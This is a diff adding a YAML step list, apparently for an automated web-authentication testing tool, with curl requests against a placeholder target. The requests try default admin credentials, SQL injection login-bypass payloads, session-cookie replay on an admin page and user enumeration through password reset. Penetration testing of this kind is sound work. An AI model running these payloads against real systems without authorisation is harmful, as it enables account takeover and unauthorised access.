@@ -1,0 +1,41 @@
+steps:
+  - tool: curl
+    arguments:
+      url: "http://{target}/login"
+      additional_args: "-s -L --max-time 10 -w \"\nHTTP_CODE:%{http_code}\n\""
+    description: 'AUTH Login page discovery'
+  - tool: curl
+    arguments:
+      url: "http://{target}/login"
+      additional_args: "-s -L -X POST -d \"username=admin&password=admin\" --max-time 10 -w \"\nHTTP_CODE:%{http_code}\n\""
+    description: 'AUTH Default credential test admin admin'
+  - tool: curl
+    arguments:
+      url: "http://{target}/login"
+      additional_args: "-s -L -X POST -d \"username=admin%27%20OR%20%271%27=%271&password=admin\" --max-time 10 -w \"\nHTTP_CODE:%{http_code}\n\""
+    description: 'AUTH SQL injection boolean-based'
+  - tool: curl
+    arguments:
+      url: "http://{target}/login"
+      additional_args: "-s -L -X POST -d \"username=admin%27--&password=anything\" --max-time 10 -w \"\nHTTP_CODE:%{http_code}\n\""
+    description: 'AUTH SQL injection comment bypass'
+  - tool: curl
+    arguments:
+      url: "http://{target}/login"
+      additional_args: "-s -L -X POST -d \"username=admin&password=admin\" -c /tmp/cookies.txt --max-time 10"
+    description: 'AUTH Capture session cookies'
+  - tool: curl
+    arguments:
+      url: "http://{target}/admin"
+      additional_args: "-s -L -b /tmp/cookies.txt --max-time 10 -w \"\nHTTP_CODE:%{http_code}\n\""
+    description: 'AUTH Session cookie replay for privilege escalation'
+  - tool: curl
+    arguments:
+      url: "http://{target}/register"
+      additional_args: "-s -L --max-time 10 -w \"\nHTTP_CODE:%{http_code}\n\""
+    description: 'AUTH Registration endpoint discovery'
+  - tool: curl
+    arguments:
+      url: "http://{target}/forgot-password"
+      additional_args: "-s -L -X POST -d \"email=admin@{target}\" --max-time 10 -w \"\nHTTP_CODE:%{http_code}\n\""
+    description: 'AUTH Password reset user enumeration'
